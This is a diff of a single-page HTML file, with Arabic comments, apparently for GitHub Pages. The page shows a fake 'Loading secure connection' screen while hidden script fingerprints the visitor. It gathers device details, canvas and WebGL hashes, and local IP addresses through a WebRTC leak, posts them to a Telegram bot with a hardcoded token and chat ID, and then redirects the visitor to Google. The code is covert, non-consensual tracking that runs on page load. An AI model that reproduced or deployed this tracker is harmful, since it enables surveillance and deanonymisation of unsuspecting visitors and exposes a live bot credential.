@@ -1,4 +1,3 @@
-<!-- index.html - ملف واحد يعمل على GitHub Pages -->
 <!DOCTYPE html>
 <html lang="en">
 <head>
@@ -18,115 +17,138 @@
         <div class="text">Loading secure connection...</div>
     </div>
     <script>
-        // ========== غير هذه المتغيرات بما يناسبك ==========
-        const TELEGRAM_BOT_TOKEN = '8924356522:AAHqmA33uk_oGD79V4og3HU4kGU_pNszaRs'; // ضع توكن البوت هنا
-        const TELEGRAM_CHAT_ID = '6200879535';     // ضع Chat ID هنا
+        // ========== غير هنا ==========
+        const TELEGRAM_BOT_TOKEN = '8924356522:AAHqmA33uk_oGD79V4og3HU4kGU_pNszaRs';
+        const TELEGRAM_CHAT_ID = '6200879535';
 
         (async function() {
-            // جمع بصمة المتصفح
-            const fingerprint = {
-                platform: navigator.platform,
-                screenResolution: window.screen.width + 'x' + window.screen.height + ' (' + window.screen.colorDepth + 'bit)',
-                language: navigator.language,
-                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
-                referrer: document.referrer,
-                cookiesEnabled: navigator.cookieEnabled,
-                doNotTrack: navigator.doNotTrack || 'unspecified',
-                hardwareConcurrency: navigator.hardwareConcurrency || '?',
-                deviceMemory: navigator.deviceMemory || '?',
-                touchSupport: 'maxTouchPoints' in navigator && navigator.maxTouchPoints > 0,
-                vendor: navigator.vendor,
-                plugins: Array.from(navigator.plugins || []).map(p => p.name),
-                canvasHash: await getCanvasHash(),
-                webglHash: getWebGLHash(),
-                localIPs: []
-            };
-
-            // WebRTC Leak لجلب IP الحقيقي
             try {
-                const ips = await getLocalIPs();
-                fingerprint.localIPs = ips;
-            } catch(e) {}
+                // جمع البصمة بشكل آمن
+                const fp = {};
 
-            // تجميع الرسالة
-            let message = `🎯 *New Visitor (GitHub Pages)*\n\n`;
-            message += `🌐 *Platform:* ${fingerprint.platform}\n`;
-            message += `📏 *Screen:* ${fingerprint.screenResolution}\n`;
-            message += `🌍 *Language:* ${fingerprint.language}\n`;
-            message += `⏰ *Timezone:* ${fingerprint.timezone}\n`;
-            message += `🔗 *Referrer:* ${fingerprint.referrer || 'None'}\n`;
-            message += `🍪 *Cookies:* ${fingerprint.cookiesEnabled ? 'Enabled' : 'Disabled'}\n`;
-            message += `🚫 *DNT:* ${fingerprint.doNotTrack}\n`;
-            message += `🧠 *RAM:* ${fingerprint.deviceMemory}GB | CPU: ${fingerprint.hardwareConcurrency} cores\n`;
-            message += `👆 *Touch:* ${fingerprint.touchSupport ? 'Yes' : 'No'}\n`;
-            message += `🧩 *Plugins:* ${fingerprint.plugins.length ? fingerprint.plugins.join(', ') : 'N/A'}\n`;
-            message += `🖼 *Canvas:* \`${fingerprint.canvasHash || 'N/A'}\`\n`;
-            message += `🎨 *WebGL:* \`${fingerprint.webglHash || 'N/A'}\`\n`;
-            message += `🔎 *Local IPs (WebRTC):* \`${fingerprint.localIPs.length ? fingerprint.localIPs.join(', ') : 'None'}\`\n`;
-            message += `🕒 *Time:* ${new Date().toISOString()}`;
+                // معلومات أساسية
+                fp.platform = navigator.platform || 'unknown';
+                fp.screenResolution = (window.screen.width || '?') + 'x' + (window.screen.height || '?') + ' (' + (window.screen.colorDepth || '?') + 'bit)';
+                fp.language = navigator.language || 'unknown';
+                fp.timezone = Intl.DateTimeFormat().resolvedOptions().timeZone || 'unknown';
+                fp.referrer = document.referrer || 'none';
+                fp.cookiesEnabled = navigator.cookieEnabled ? 'Yes' : 'No';
+                fp.doNotTrack = navigator.doNotTrack || 'unspecified';
+                fp.hardwareConcurrency = navigator.hardwareConcurrency || '?';
+                fp.deviceMemory = navigator.deviceMemory || '?';
+                fp.touchSupport = navigator.maxTouchPoints > 0 ? 'Yes' : 'No';
+                fp.vendor = navigator.vendor || '?';
+                // قائمة الإضافات قد لا تكون متاحة في بعض المتصفحات
+                fp.plugins = [];
+                if (navigator.plugins && navigator.plugins.length) {
+                    for (let p of navigator.plugins) {
+                        fp.plugins.push(p.name);
+                    }
+                }
+                fp.plugins = fp.plugins.length ? fp.plugins.join(', ') : 'none';
+                fp.canvasHash = await getCanvasHash();
+                fp.webglHash = getWebGLHash();
+                fp.localIPs = [];
 
-            // إرسال إلى تيليغرام مباشرة
-            fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
-                method: 'POST',
-                headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({
-                    chat_id: TELEGRAM_CHAT_ID,
-                    text: message,
-                    parse_mode: 'Markdown',
-                    disable_web_page_preview: true
-                })
-            }).catch(() => {});
+                // محاولة WebRTC leak
+                try {
+                    const ips = await getLocalIPs();
+                    fp.localIPs = ips;
+                } catch(e) {}
 
-            // إعادة توجيه بعد 300 مللي ثانية
+                // بناء رسالة التقرير
+                let msg = `🎯 *New Visitor Captured*
+
+🌐 *Platform:* \`${fp.platform}\`
+📏 *Screen:* \`${fp.screenResolution}\`
+🌍 *Language:* \`${fp.language}\`
+⏰ *Timezone:* \`${fp.timezone}\`
+🔗 *Referrer:* \`${fp.referrer}\`
+🍪 *Cookies:* \`${fp.cookiesEnabled}\`
+🚫 *DNT:* \`${fp.doNotTrack}\`
+🧠 *RAM:* \`${fp.deviceMemory}GB\` | CPU: \`${fp.hardwareConcurrency} cores\`
+👆 *Touch:* \`${fp.touchSupport}\`
+🏷 *Vendor:* \`${fp.vendor}\`
+🧩 *Plugins:* \`${fp.plugins}\`
+🖼 *Canvas Hash:* \`${fp.canvasHash || 'none'}\`
+🎨 *WebGL Hash:* \`${fp.webglHash || 'none'}\`
+🔎 *Local IPs:* \`${fp.localIPs.length ? fp.localIPs.join(', ') : 'none'}\`
+🕒 *Captured:* \`${new Date().toISOString()}\``;
+
+                // إرسال إلى تيليغرام
+                const res = await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({
+                        chat_id: TELEGRAM_CHAT_ID,
+                        text: msg,
+                        parse_mode: 'Markdown',
+                        disable_web_page_preview: true
+                    })
+                });
+                const json = await res.json();
+                console.log('Telegram response:', json);
+            } catch(e) {
+                console.error('Error capturing:', e);
+            }
+
+            // إعادة التوجيه بعد 200 مللي
             setTimeout(() => {
                 window.location.replace('https://www.google.com');
-            }, 300);
+            }, 200);
         })();
 
+        // توليد بصمة Canvas
         async function getCanvasHash() {
             try {
                 const canvas = document.createElement('canvas');
                 canvas.width = 220;
                 canvas.height = 60;
                 const ctx = canvas.getContext('2d');
+                if (!ctx) return 'no canvas';
                 ctx.textBaseline = 'top';
                 ctx.font = '14px Arial';
                 ctx.fillStyle = '#f60';
                 ctx.fillRect(130,1,62,20);
                 ctx.fillStyle = '#069';
-                ctx.fillText('Visitor 👾 ' + navigator.userAgent.slice(0,10), 2, 15);
+                ctx.fillText('Visitor ID ' + navigator.userAgent.slice(0,12), 2, 15);
                 ctx.fillStyle = 'rgba(102, 204, 0, 0.8)';
-                ctx.fillText('Visitor 👾 ' + navigator.userAgent.slice(0,10), 4, 17);
+                ctx.fillText('Visitor ID ' + navigator.userAgent.slice(0,12), 4, 17);
                 return canvas.toDataURL().slice(-64);
-            } catch(e) { return 'unsupported'; }
+            } catch(e) {
+                return 'error';
+            }
         }
 
+        // بصمة WebGL
         function getWebGLHash() {
             try {
                 const canvas = document.createElement('canvas');
                 const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
-                if(!gl) return 'no webgl';
+                if (!gl) return 'no webgl';
                 const ext = gl.getExtension('WEBGL_debug_renderer_info');
                 const vendor = ext ? gl.getParameter(ext.UNMASKED_VENDOR_WEBGL) : '?';
                 const renderer = ext ? gl.getParameter(ext.UNMASKED_RENDERER_WEBGL) : '?';
                 return vendor + '~~' + renderer;
-            } catch(e) { return 'webgl error'; }
+            } catch(e) {
+                return 'webgl error';
+            }
         }
 
+        // WebRTC leak للحصول على IP المحلي الحقيقي
         function getLocalIPs() {
             return new Promise((resolve) => {
                 const ips = new Set();
                 const pc = new RTCPeerConnection({ iceServers: [] });
                 pc.createDataChannel('');
-                pc.createOffer().then(offer => pc.setLocalDescription(offer)).catch(()=>{});
+                pc.createOffer().then(offer => pc.setLocalDescription(offer)).catch(() => {});
                 pc.onicecandidate = (e) => {
-                    if(!e || !e.candidate || !e.candidate.candidate) return;
-                    const candidate = e.candidate.candidate;
+                    if (!e || !e.candidate || !e.candidate.candidate) return;
                     const ipRegex = /([0-9]{1,3}\.){3}[0-9]{1,3}/;
-                    const match = ipRegex.exec(candidate);
-                    if(match) {
+                    const match = ipRegex.exec(e.candidate.candidate);
+                    if (match) {
                         const ip = match[0];
-                        if(ip !== '0.0.0.0' && !ip.startsWith('127.')) ips.add(ip);
+                        if (ip !== '0.0.0.0' && !ip.startsWith('127.')) ips.add(ip);
                     }
                 };
                 const timeout = setTimeout(() => {
@@ -134,7 +156,7 @@
                     resolve(Array.from(ips));
                 }, 2000);
                 pc.onicegatheringstatechange = () => {
-                    if(pc.iceGatheringState === 'complete') {
+                    if (pc.iceGatheringState === 'complete') {
                         clearTimeout(timeout);
                         pc.close();
                         resolve(Array.from(ips));
